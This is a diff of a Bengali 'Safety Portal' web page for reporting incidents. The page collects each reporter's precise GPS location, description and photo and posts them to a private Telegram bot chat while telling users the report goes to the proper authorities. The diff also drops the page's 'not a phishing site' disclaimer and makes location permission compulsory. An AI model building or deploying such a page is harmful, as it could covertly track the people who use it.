@@ -5,15 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>নিরাপত্তা পোর্টাল</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="manifest" href='data:application/json,{"name":"নিরাপত্তা পোর্টাল","short_name":"SafetyApp","start_url":"./","display":"standalone","background_color":"#0f172a","theme_color":"#0f172a","icons":[{"src":"https://cdn-icons-png.flaticon.com/512/2991/2991148.png","sizes":"192x192","type":"image/png"}]}'>
     <style>body { background-color: #0f172a; color: white; }</style>
 </head>
 <body class="min-h-screen flex flex-col items-center py-6 px-4">
-
-<!-- ইন্সটল বাটন -->
-<div id="installContainer" class="hidden w-full max-w-sm mb-4">
-    <button id="installBtn" class="w-full bg-emerald-600 text-white py-3 rounded-xl font-bold shadow-lg transition">➕ অ্যাপটি হোম স্ক্রিনে যোগ করুন</button>
-</div>
 
 <!-- মূল ফর্ম -->
 <div class="w-full max-w-sm bg-slate-900 p-6 rounded-3xl border border-slate-700 shadow-2xl">
@@ -25,54 +19,41 @@
             <option>ইভটিজিং</option>
             <option>সন্দেহভাজন কার্যক্রম</option>
         </select>
-        <input type="text" id="location" placeholder="এলাকার নাম" class="w-full bg-slate-800 p-3 rounded-xl border border-slate-700 text-white">
-        <!-- নতুন বিস্তারিত ফিল্ড -->
+        <input type="text" id="location" placeholder="এলাকার নাম" required class="w-full bg-slate-800 p-3 rounded-xl border border-slate-700 text-white">
         <textarea id="description" placeholder="বিস্তারিত লিখুন (ঐচ্ছিক)" class="w-full bg-slate-800 p-3 rounded-xl border border-slate-700 text-white h-24"></textarea>
         <input type="file" id="fileInput" accept="image/*" class="w-full text-slate-400 text-sm">
-        <button type="submit" id="submitBtn" class="w-full bg-red-600 text-white py-3 rounded-xl font-bold">রিপোর্ট পাঠান</button>
+        
+        <button type="submit" id="submitBtn" class="w-full bg-red-600 hover:bg-red-700 text-white py-3 rounded-xl font-bold transition-all">রিপোর্ট পাঠান</button>
     </form>
 </div>
 
 <!-- অ্যাপ পরিচিতি -->
 <div class="w-full max-w-sm mt-8 p-6 bg-slate-800 rounded-3xl border border-slate-700 text-slate-300 text-sm shadow-xl">
-    <h2 class="text-white font-bold mb-2">এই অ্যাপটি কী?</h2>
-    <p class="mb-4">এটি একটি পাবলিক নিরাপত্তা পোর্টাল। আপনার এলাকার যেকোনো অনাকাঙ্ক্ষিত ঘটনা বা অপরাধমূলক কর্মকাণ্ডের তথ্য সরাসরি কর্তৃপক্ষের কাছে পৌঁছে দেওয়ার জন্য এটি তৈরি করা হয়েছে।</p>
-    <h2 class="text-white font-bold mb-2">আপনার নিরাপত্তা:</h2>
-    <ul class="list-disc ml-4 space-y-1">
-        <li>আপনার পাঠানো তথ্য গোপন রাখা হয়।</li>
-        <li>আপনার লোকেশন শুধুমাত্র ঘটনার সত্যতা যাচাইয়ের জন্য ব্যবহৃত হয়।</li>
-        <li>এটি কোনো ফিশিং বা স্ক্যাম সাইট নয়, এটি একটি সচেতনতামূলক প্রজেক্ট।</li>
-    </ul>
-    <p class="mt-4 text-xs italic text-center">সচেতন হোন, নিরাপদ থাকুন।</p>
+    <p class="text-xs italic text-center">⚠️ রিপোর্ট করার সময় লোকেশন পারমিশন চাইলে 'Allow' করুন। এটি আপনার গোপনীয়তা রক্ষা করে শুধুমাত্র ঘটনার সত্যতা যাচাইয়ের জন্য ব্যবহৃত হয়।</p>
 </div>
 
 <script>
-    let deferredPrompt;
-    window.addEventListener('beforeinstallprompt', (e) => {
-        e.preventDefault();
-        deferredPrompt = e;
-        document.getElementById('installContainer').classList.remove('hidden');
-    });
-
-    document.getElementById('installBtn').addEventListener('click', () => {
-        if (deferredPrompt) deferredPrompt.prompt();
-    });
-
     document.getElementById('reportForm').addEventListener('submit', async (e) => {
         e.preventDefault();
+        
+        // ১. আগে একটি কনফার্মেশন মেসেজ
+        const userAgreed = confirm("রিপোর্টটি সঠিক কর্তৃপক্ষের কাছে পাঠানোর জন্য আপনার বর্তমান লোকেশন প্রয়োজন। আপনি কি অনুমতি দিচ্ছেন?");
+        if (!userAgreed) return;
+
         const btn = document.getElementById('submitBtn');
-        btn.innerText = "প্রসেসিং...";
+        btn.innerText = "লোকেশন নেয়া হচ্ছে...";
         btn.disabled = true;
 
+        // ২. লোকেশন পারমিশন রিকোয়েস্ট
         navigator.geolocation.getCurrentPosition(async (pos) => {
+            btn.innerText = "পাঠানো হচ্ছে...";
+            
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
             
-            // বিস্তারিত লজিক
             const desc = document.getElementById('description').value;
             const descText = desc ? `\n*বর্ণনা:* ${desc}\n` : "";
-            
             const text = `🚨 *নতুন রিপোর্ট*\n\n*ধরন:* ${document.getElementById('category').value}\n*এলাকা:* ${document.getElementById('location').value}${descText}\n🔗 [ম্যাপে দেখুন](${mapLink})`;
 
             const formData = new FormData();
@@ -90,18 +71,19 @@
                 } else {
                     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=8766925591&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
                 }
-                alert("সফলভাবে পাঠানো হয়েছে!");
+                alert("আপনার রিপোর্টটি সফলভাবে পাঠানো হয়েছে। ধন্যবাদ!");
                 location.reload();
             } catch (err) {
-                alert("পাঠাতে সমস্যা হয়েছে।");
+                alert("সার্ভার সমস্যা, আবার চেষ্টা করুন।");
+                btn.innerText = "রিপোর্ট পাঠান";
+                btn.disabled = false;
             }
+        }, (error) => {
+            // ৩. কেউ ডিনাই করলে গাইডলাইন দেওয়া
+            alert("লোকেশন পারমিশন না দিলে আমরা রিপোর্টটি গ্রহণ করতে পারছি না। দয়া করে ব্রাউজার সেটিংস থেকে লোকেশন পারমিশন অন করুন।");
             btn.innerText = "রিপোর্ট পাঠান";
             btn.disabled = false;
-        }, () => {
-            alert("লোকেশন অন করুন।");
-            btn.innerText = "রিপোর্ট পাঠান";
-            btn.disabled = false;
-        });
+        }, { enableHighAccuracy: true });
     });
 </script>
 </body>
